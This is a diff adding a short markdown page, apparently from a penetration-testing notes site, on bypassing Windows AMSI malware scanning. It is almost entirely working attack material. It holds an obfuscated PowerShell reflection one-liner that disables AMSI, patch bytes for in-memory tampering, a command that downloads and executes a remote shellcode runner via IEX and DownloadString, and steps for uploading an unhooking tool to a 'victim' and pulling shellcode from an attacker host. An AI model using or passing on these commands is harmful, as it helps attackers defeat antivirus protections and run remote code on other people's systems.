@@ -1,0 +1,31 @@
+---
+title: "AMSI Bypass"
+description: "AMSI patching and unhooking shellcode runners."
+---
+
+Two methods available:
+
+## Method 1: Patching
+
+```powershell
+$m="System.Management.Automation.Ams"
+[Ref].Assembly.GetType("$m"+"iUtils").GetField('amsiInitFai'+'led','NonPublic,Static').SetValue($null,$true)
+```
+
+Or patch with XOR RAX,RAX:
+```powershell
+$buf = [Byte[]] (0x48,0x31,0xC0)
+```
+
+Execute from web:
+```powershell
+powershell -nop -exec bypass -c IEX((New-Object Net.WebClient).DownloadString('http://<IP>/shellcode_runner.html'))
+```
+
+## Method 2: Unhooking (AmsiHooker)
+
+```
+1. Upload unhook_amsi.exe and MinHook.NET.dll to victim (payloads/AMSI/)
+2. Copy shellcode runner (payloads/XOR/ or payloads/Caesar/) to web server
+3. Execute: unhook_amsi.exe http://<KALI>/shellcode_runner.exe
+```
